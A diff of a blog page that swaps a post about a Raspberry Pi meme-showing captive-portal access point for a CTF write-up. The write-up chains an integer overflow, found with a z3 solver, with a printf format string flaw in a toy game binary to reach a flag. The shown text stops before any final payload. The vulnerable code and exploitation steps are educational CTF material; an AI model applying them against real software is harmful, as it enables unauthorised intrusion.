@@ -11,7 +11,7 @@
 
   <title>
     
-      Access Point That Shows You Memes When You Connect To It &middot; Nihaal Prasad
+      Mining Hero Vulnerabilities &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Access Point That Shows You Memes When You Connect To It</h1>
+  <h1 class="page-heading">Mining Hero Vulnerabilities</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,131 +193,414 @@
 
   <hr>
   <div class="post-body">
-    <p>Hello everyone! Today I’m going to show you how I built an access point that is able to send memes to anyone who connects to it. The way it works is simple: First the user connects to the access point from the Wifi settings on their device, and once they try connecting to any website, they’ll be shown a meme instead. You can see in the images below how this appears on my phone after it has connected to my wifi.</p>
+    <p><a href="../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp">Mining Hero</a> (click <a href="../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game">here</a> for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.</p>
 
-<p><img style="width: 60%; height: 60%;" src="../../../assets/img/2018-12-21-wifi-that-only-shows-memes/availablenetworks.jpg" />
-<img style="width: 60%; height: 60%;" src="../../../assets/img/2018-12-21-wifi-that-only-shows-memes/meme1.jpg" />
-<img style="width: 10%: height: 10%;" src="../../../assets/img/2018-12-21-wifi-that-only-shows-memes/meme2.jpg" /></p>
-
-<p>As you can see, whenever someone tries to connect to a website after connecting to my wireless access point, they will instead be redirected to a web page that shows random memes. Also, if you refresh the page, a different meme will be randomly chosen.</p>
-
-<p>The first thing I did to set this up was grab my new <a href="https://www.raspberrypi.org/">Raspberry Pi</a> that I had just bought and install the <a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian OS</a> using <a href="https://www.raspberrypi.org/downloads/noobs/">NOOBS</a>.</p>
-
-<p><img style="width: 50%; height: 50%; float: right;" src="../../../assets/img/2018-12-21-wifi-that-only-shows-memes/raspberrypi.jpg" />
-<img style="width: 50%; height: 50%;" src="../../../assets/img/2018-12-21-wifi-that-only-shows-memes/noobs.jpg" /></p>
-
-<p>Next, I had to configure my Raspberry Pi to work as an access point. This took me a couple of steps. First, I had to go download all of the tools that I would use.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install hostapd dnsmasq libmicrohttpd-dev
-git clone https://github.com/nodogsplash/nodogsplash.git
+<p>When I compiled the binary, <code class="highlighter-rouge">g++</code> immediately told me that there was a format string vulnerability in the code. This information will become useful later.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>g++ <span class="nt">-fno-stack-protector</span> <span class="nt">-g</span> <span class="nt">-Wall</span> <span class="nt">-o</span> text-game text-game.cpp
+text-game.cpp: In <span class="k">function</span> ‘void purchase<span class="o">()</span>’:
+text-game.cpp:150:34: warning: operation on ‘tools_left’ may be undefined <span class="o">[</span><span class="nt">-Wsequence-point</span><span class="o">]</span>
+  150 |    &lt;&lt; <span class="s2">"now have "</span> &lt;&lt; <span class="o">(</span>tools_left +<span class="o">=</span> count - 1<span class="o">)</span> &lt;&lt; <span class="s2">" spare tool"</span>
+      |                      ~~~~~~~~~~~~^~~~~~~~~~~~~
+text-game.cpp:161:41: warning: suggest parentheses around comparison <span class="k">in </span>operand of ‘&amp;’ <span class="o">[</span><span class="nt">-Wparentheses</span><span class="o">]</span>
+  161 |   bool god_is_happy <span class="o">=</span> rand<span class="o">()</span> &amp; 0xFFFFFF <span class="o">==</span> 0<span class="p">;</span>
+      |                                ~~~~~~~~~^~~~
+text-game.cpp:164:22: warning: format not a string literal and no format arguments <span class="o">[</span><span class="nt">-Wformat-security</span><span class="o">]</span>
+  164 |   <span class="nb">printf</span><span class="o">(</span>name.c_str<span class="o">())</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>I also went online and downloaded a bunch of memes that I liked. Then I went into my /etc/dhcpcd.conf file and added the following line to the file:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>denyinterfaces wlan0
+<p>When I first played the game, I was given four different options.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./text-game 
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+Nihaal
+Current funds: $150
+Your options are: 
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
 </code></pre></div></div>
 
-<p>I also had to setup a static IP address for my Raspberry Pi for obvious reasons. I did this by appending the /etc/network/interfaces file with these lines:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auto wlan0
-iface wlan0 inet static
-address 192.168.1.1
-netmask 255.255.255.0
+<p>Selecting option two is the only reliable way to make more money. The downside to using this option is that it pauses the program for a moment (by calling the <code class="highlighter-rouge">usleep()</code> function), making it difficult to brute-force the program using only this option.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2
+You go to work in the mines
+[..........]
+[=.........]
+[==........]
+[===.......]
+[====......]
+[=====.....]
+[======....]
+[=======...]
+[========..]
+[=========.]
+[==========]
+It was a normal days work. You earned $7. Your balance is now $157.
+Current funds: $157
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
 </code></pre></div></div>
 
-<p>This allowed me to setup a static IP address of 192.168.1.1. Once I did this, I had to restart dhcpcd using this command:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service dhcpcd restart
+<p>Option one gives you a chance to double your money.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1
+A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
+heads
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 157.
+157
+... and the coin came up heads!! You just got $157! Congratulations! Your balance is $314
+Current funds: $314
+Your options are: 
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
 </code></pre></div></div>
 
-<p>The next step was to configure hostapd. Hostapd was the program that I was going to use to make my Raspberry Pi turn into an access point. I created a file called /etc/hostapd/hostapd.conf and added these settings to it:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface=wlan0 # Use wlan0 interface
-driver=nl80211 # Use this driver (you might have to google which driver is the correct one for your wifi card)
-ctrl_interface=/var/run/hostapd # Location of hostapd program
-ctrl_interface_group=0
-ssid=ClickHereForMemes # SSID that will be broadcasted
-hw_mode=g
-channel=6 # Which channel we are on
-wpa=0 # Disable encryption
-beacon_int=100 # How often we will send out a beacon
-ignore_broadcast_ssid=0 # Don't ignore broadcast requests
+<p>Option three is interesting. It allows us to buy various things that could either allow us to mine things faster (encouragement) or get more money while mining (tools). It also includes a <code class="highlighter-rouge">shout-out-from-literally-god</code> option, which costs a huge sum of money.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+1
+You can do it! Go you!
+You are now very encouraged! Your mining speed has increased.
+Current funds: $294
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
 </code></pre></div></div>
 
-<p>I had disabled WPA2 encryption because this was a simple project, and I didn’t really care whether my Raspberry Pi got hacked or not. But if you wanted to setup WPA2 encryption, you could do it using this configuration file.</p>
+<p>Looking at the <code class="highlighter-rouge">purchase()</code> function in the code, it appears that our goal is to somehow buy the <code class="highlighter-rouge">shout-out-from-literally-god</code> option. However, even if we buy this option, there is still no guarantee that we will get the flag. The function only prints out the flag if <code class="highlighter-rouge">rand() &amp; 0xFFFFFF</code> equals zero, and since there is no way for us to actually control the output of <code class="highlighter-rouge">rand()</code>, there is no way for us to guarantee that we get the flag even after getting a shout out from god.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
 
-<p>I had to tell hostapd where to look for the config file when it starts up on boot, so I opened up /etc/default/hostapd, and replaced this line:</p>
+<span class="kt">void</span> <span class="n">purchase</span><span class="p">(){</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#DAEMON_CONF=""
+    <span class="p">[...]</span>
+
+	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="s">"shout-out-from-literally-god"</span><span class="p">){</span>
+		<span class="n">bool</span> <span class="n">god_is_happy</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFF</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">bool</span><span class="o">*</span> <span class="n">god_is_really_happy</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">god_is_happy</span><span class="p">;</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Hmmmm</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You have done well!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Good job!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+		<span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">god_is_really_happy</span><span class="p">){</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">"I'm feeling generous right now!</span><span class="se">\n</span><span class="s">Have a flag!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+			<span class="n">std</span><span class="o">::</span><span class="n">ifstream</span> <span class="n">t</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">);</span>
+			<span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">str</span><span class="p">((</span><span class="n">std</span><span class="o">::</span><span class="n">istreambuf_iterator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">t</span><span class="p">)),</span>
+				                 <span class="n">std</span><span class="o">::</span><span class="n">istreambuf_iterator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">());</span>
+			<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">str</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Sincerely,</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">~God</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="p">[...]</span>
 </code></pre></div></div>
 
-<p>with this line:</p>
+<p>When looking at this block of code, one thing that I thought was strange was that the programmer made a function pointer called <code class="highlighter-rouge">bool* god_is_really_happy</code>. The first question that popped into my mind was, “What was the point of making this pointer?” It seems pretty much useless since the programmer could have just used <code class="highlighter-rouge">god_is_happy</code> in place of <code class="highlighter-rouge">*god_is_really_happy</code> in the if statement.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DAEMON_CONF="/etc/hostapd/hostapd.conf"
+<p>My question was answered when I looked a little bit further down and remembered the format string vulnerability. The line that says <code class="highlighter-rouge">printf(name.c_str())</code> prints out our name directly using <code class="highlighter-rouge">printf()</code> instead of using a format string (The secure way of doing this would be to use <code class="highlighter-rouge">printf("%s", name.c_str())</code>). We could exploit the format string vulnerability by putting string formatters in <code class="highlighter-rouge">name</code>.</p>
+
+<p>At this point in time, we have two goals:</p>
+<ol>
+  <li>Find a vulnerability that allows us to buy the <code class="highlighter-rouge">shout-out-from-literally-god</code> option.</li>
+  <li>Exploit the format string vulnerability to write anything (other than zero) to the address <code class="highlighter-rouge">god_is_really_happy</code>.</li>
+</ol>
+
+<p>Instead of doing step one, you could also try to brute-force the program until you got enough money, but I didn’t go with that solution.</p>
+
+<p>The first vulnerability took me a long time to see. I manually inputted various characters when the program asked for a specific type of input, and I was specifically looking for integer overflow vulnerabilities that increased my money (though, I would later find out that increasing my money was not necessary). Typing -1 when betting did not work.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+1
+A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
+heads
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+-1
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
+-1
+How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
 </code></pre></div></div>
 
-<p>Now that our access point is working, I had to go configure dnsmasq. Dnsmasq is used as a lightweight DNS and DHCP server, which makes it perfect for this project. Since I didn’t want to lose the original configuration file, I moved it.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
+<p>However, when I did the same thing while buying something, the program said that I didn’t have enough money to buy encouragement, even though I did. The only reasonable explanation for this behavior would be that it interprets the quantity as an unsigned integer, even though I am typing it as a signed integer.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+-1
+You don't have the money for that!
 </code></pre></div></div>
 
-<p>I then created a new /etc/dnsmasq.conf file and typed this in there:</p>
+<p>I spent a few minutes trying out a bunch of different negative numbers to see if any of them would allow me to actually buy <code class="highlighter-rouge">encouragement</code>. Although I was unsuccessful by simply using trial-and-error, this was enough to pique my interest, so I decided to take another look at the code for purchasing items. In the top half of the <code class="highlighter-rouge">purchase()</code>, we can see exactly how the quantity is interpreted.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interace=wlan0 # Which interface we will use
-listen-address=192.168.1.1 # What address we are listening on (which should be our static IP)
-bind-interfaces # Bind the interfaces
-server=8.8.8.8 # Use Google's DNS server
-domain-needed
-bogus-priv
-dhcp-range=192.168.1.50,192.168.1.150,12h # Give IP addresses in the range of 192.168.1.50-150 with a 12 hour lease time
+<span class="kt">void</span> <span class="n">purchase</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="o">&gt;</span> <span class="n">prices</span><span class="p">{</span>
+        <span class="p">{</span> <span class="s">"tool"</span><span class="p">,</span> <span class="mi">100</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="s">"encouragement"</span><span class="p">,</span> <span class="mi">20</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="s">"shout-out-from-literally-god"</span><span class="p">,</span> <span class="mi">1000000000000000ULL</span> <span class="p">}</span>
+    <span class="p">};</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">option</span><span class="p">{};</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"What would you like to buy? Options are "</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">prices</span><span class="p">){</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">entry</span><span class="p">.</span><span class="n">first</span> <span class="o">&lt;&lt;</span> <span class="s">" (cost: "</span> <span class="o">&lt;&lt;</span> <span class="n">entry</span><span class="p">.</span><span class="n">second</span> <span class="o">&lt;&lt;</span> <span class="s">"), "</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"or cancel"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">option</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">option</span> <span class="o">==</span> <span class="s">"cancel"</span><span class="p">){</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">prices</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="o">==</span> <span class="n">prices</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">count</span><span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"How many would you like to buy? Must be greater than 0"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">count</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">.</span><span class="n">good</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">count</span><span class="p">);</span>
+
+    <span class="k">auto</span> <span class="n">item_cost</span><span class="p">{</span> <span class="n">prices</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">};</span>
+    <span class="k">auto</span> <span class="n">total</span><span class="p">{</span> <span class="n">item_cost</span> <span class="o">*</span> <span class="n">count</span> <span class="p">};</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">total</span> <span class="o">&gt;</span> <span class="n">player_funds</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"You don't have the money for that!"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">player_funds</span> <span class="o">-=</span> <span class="n">total</span><span class="p">;</span>
+
+    <span class="p">[...]</span>
+
+<span class="p">}</span>
+
+<span class="p">[...]</span>
 </code></pre></div></div>
 
-<p>Now our access point should be fully setup. Our final step is to setup a captive portal using nodogsplash. This captive portal will work as the website that only shows memes. I had to install nodogslash from the github repository that I cloned earlier.</p>
+<p>There are four variables that we care about in this code. All four of these variables are stored as <code class="highlighter-rouge">unsigned long long</code>, which is 64 bits on my system.</p>
+<ul>
+  <li><code class="highlighter-rouge">player_funds</code> - Contains our money</li>
+  <li><code class="highlighter-rouge">item_cost</code> - The price of the thing we want to buy</li>
+  <li><code class="highlighter-rouge">count</code> - The quantity that we typed in</li>
+  <li><code class="highlighter-rouge">total</code> - Equal to <code class="highlighter-rouge">item_cost * count</code></li>
+</ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~/nodogsplash
-make
-sudo make install
+<p>What if we could input the value <code class="highlighter-rouge">count</code> such that <code class="highlighter-rouge">total</code> is something that is less than the actual price of <code class="highlighter-rouge">item</code>? This could allow us to buy items that we do not have enough money for. In other words, we want <code class="highlighter-rouge">count</code> to be a value such that <code class="highlighter-rouge">count * item_cost &lt; player_funds</code>. However, we cannot simply input 0 as count because the program checks for zeros.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+0
+How many would you like to buy? Must be greater than 0
+0
+How many would you like to buy? Must be greater than 0
 </code></pre></div></div>
 
-<p>I went into the /etc/nodogsplash/nodogsplash.conf file and changed the GatewayInterface</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GatewayInterface wlan0
+<p>We know that we can type in signed integers and have them be interpreted as unsigned integers, so what if we tried a value for <code class="highlighter-rouge">count</code> that was negative? In order to find such a value for <code class="highlighter-rouge">count</code>, I decided to use <code class="highlighter-rouge">z3</code>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Python</span> <span class="mf">3.8.5</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Jul</span> <span class="mi">28</span> <span class="mi">2020</span><span class="p">,</span> <span class="mi">12</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">40</span><span class="p">)</span>
+<span class="p">[</span><span class="n">GCC</span> <span class="mf">9.3.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">total</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'total'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">player_funds</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'player_funds'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">item_cost</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'item_cost'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">count</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">'count'</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">solve</span><span class="p">(</span><span class="n">total</span> <span class="o">==</span> <span class="n">item_cost</span> <span class="o">*</span> <span class="n">count</span><span class="p">,</span> <span class="n">item_cost</span> <span class="o">==</span> <span class="mi">1000000000000000</span><span class="p">,</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ULE</span><span class="p">(</span><span class="n">total</span><span class="p">,</span> <span class="n">player_funds</span><span class="p">),</span> <span class="n">player_funds</span> <span class="o">==</span> <span class="mi">150</span><span class="p">)</span>
+<span class="p">[</span><span class="n">total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+ <span class="n">count</span> <span class="o">=</span> <span class="mi">9223372036854775808</span><span class="p">,</span>
+ <span class="n">player_funds</span> <span class="o">=</span> <span class="mi">150</span><span class="p">,</span>
+ <span class="n">item_cost</span> <span class="o">=</span> <span class="mi">1000000000000000</span><span class="p">]</span>
 </code></pre></div></div>
 
-<p>Now we have to actually go and edit the captive portal to display memes instead of displaying a captive portal. The html files for the captive portal are located at /etc/nodogsplash/htdocs/. I edited the splash.html file to look like this:</p>
+<p>Let me explain how this code works. First of all, we create the four variables that we care about: <code class="highlighter-rouge">total</code>, <code class="highlighter-rouge">player_funds</code>, <code class="highlighter-rouge">item_cost</code>, and <code class="highlighter-rouge">count</code>. We initialize each of these variables by using a bit vector with 64 bits (since <code class="highlighter-rouge">unsigned long long</code> variables are 64 bits on my machine). We then solve the problem using the following constraints:</p>
+<ul>
+  <li>Make sure that <code class="highlighter-rouge">total</code> is equal to <code class="highlighter-rouge">item_cost * count</code> because that is how <code class="highlighter-rouge">total</code> is calculated in the code.</li>
+  <li>Make sure that the <code class="highlighter-rouge">item_cost</code> is the price of <code class="highlighter-rouge">shout-out-from-literally-god</code>.</li>
+  <li>Make sure that <code class="highlighter-rouge">count</code> is negative so that we can actually do the integer overflow.</li>
+  <li>Make sure that <code class="highlighter-rouge">total &lt;= player_funds</code>. Note that I used <code class="highlighter-rouge">ULE()</code> here because it makes unsigned comparisons.</li>
+  <li>Make sure that <code class="highlighter-rouge">player_funds</code> is equal to 150, which is the amount that we always start with.</li>
+</ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
-    <span class="nt">&lt;head&gt;</span>
-        <span class="nt">&lt;title&gt;</span>Random Memes<span class="nt">&lt;/title&gt;</span>
-    <span class="nt">&lt;/head&gt;</span>
-    <span class="nt">&lt;body&gt;</span>
-        <span class="nt">&lt;img</span> <span class="nt">/&gt;</span>
-        <span class="c">&lt;!-- Note: None of these memes were created by me --&gt;</span>
-        <span class="nt">&lt;script&gt;</span>
-            <span class="nx">files</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"250freetacos.jpg"</span><span class="p">,</span> <span class="s2">"2no3du.jpg"</span><span class="p">,</span> <span class="s2">"accidentally.jpeg"</span><span class="p">,</span> <span class="s2">"armordoesntmatch.jpeg"</span><span class="p">,</span> <span class="s2">"baby.jpg"</span><span class="p">,</span> <span class="s2">"backboneofthiscompany.jpg"</span><span class="p">,</span> <span class="s2">"becomethevaccumcleaner.jpg"</span><span class="p">,</span> <span class="s2">"beforeyougo.jpg"</span><span class="p">,</span> <span class="s2">"birdsroom.jpeg"</span><span class="p">,</span> <span class="s2">"blueshell.jpg"</span><span class="p">,</span> <span class="s2">"bombassdick.jpeg"</span><span class="p">,</span> <span class="s2">"bothlinesoftext.jpg"</span><span class="p">,</span> <span class="s2">"cameoutofthepurple.jpg"</span><span class="p">,</span> <span class="s2">"cleverargument.jpg"</span><span class="p">,</span> <span class="s2">"collectingpokemon.jpeg"</span><span class="p">,</span> <span class="s2">"computerexpert.png"</span><span class="p">,</span> <span class="s2">"coughsyrup.png"</span><span class="p">,</span> <span class="s2">"dawgwall.jpg"</span><span class="p">,</span> <span class="s2">"deadinside.png"</span><span class="p">,</span> <span class="s2">"diarreah.jpg"</span><span class="p">,</span> <span class="s2">"formalpictureofbaby.jpg"</span><span class="p">,</span> <span class="s2">"freeshipping.jpg"</span><span class="p">,</span> <span class="s2">"fuckmatthew.png"</span><span class="p">,</span> <span class="s2">"genderpaygap.jpg"</span><span class="p">,</span> <span class="s2">"gettingreadyforbed.jpg"</span><span class="p">,</span> <span class="s2">"godwhy.png"</span><span class="p">,</span> <span class="s2">"goodbyehighschool.jpg"</span><span class="p">,</span> <span class="s2">"goodexamples.jpg"</span><span class="p">,</span> <span class="s2">"headphones.jpg"</span><span class="p">,</span> <span class="s2">"highonacid.jpeg"</span><span class="p">,</span> <span class="s2">"hotelblanker.jpg"</span><span class="p">,</span> <span class="s2">"howthingsaregoing.jpg"</span><span class="p">,</span> <span class="s2">"hulksmash.jpg"</span><span class="p">,</span> <span class="s2">"iamconfusion.jpg"</span><span class="p">,</span> <span class="s2">"ididntchoosethuglife.jpg"</span><span class="p">,</span> <span class="s2">"ihategraveyards.jpeg"</span><span class="p">,</span> <span class="s2">"imgonnamissyou.jpg"</span><span class="p">,</span> <span class="s2">"improviseadaptovercome.jpg"</span><span class="p">,</span> <span class="s2">"infinitelectricity.jpeg"</span><span class="p">,</span> <span class="s2">"intellectualdominance.jpeg"</span><span class="p">,</span> <span class="s2">"itlookslikeapotato.jpeg"</span><span class="p">,</span> <span class="s2">"itswednesday.jpg"</span><span class="p">,</span> <span class="s2">"justchillingnaked.jpeg"</span><span class="p">,</span> <span class="s2">"lookingatmemesinbathroom.png"</span><span class="p">,</span> <span class="s2">"makingdildos.jpeg"</span><span class="p">,</span> <span class="s2">"marriage.jpg"</span><span class="p">,</span> <span class="s2">"monopolyisbetterthanpizza.png"</span><span class="p">,</span> <span class="s2">"mycutepet.jpg"</span><span class="p">,</span> <span class="s2">"myheart.jpg"</span><span class="p">,</span> <span class="s2">"nodogsallowed.jpg"</span><span class="p">,</span> <span class="s2">"nogoodanswer.jpeg"</span><span class="p">,</span> <span class="s2">"noitspatrick.jpg"</span><span class="p">,</span> <span class="s2">"notacop.jpg"</span><span class="p">,</span> <span class="s2">"parallelparking.jpg"</span><span class="p">,</span> <span class="s2">"parasites.jpg"</span><span class="p">,</span> <span class="s2">"peppapig.png"</span><span class="p">,</span> <span class="s2">"pokingpeopleatfunerals.jpg"</span><span class="p">,</span> <span class="s2">"pretendingtowork.jpeg"</span><span class="p">,</span> <span 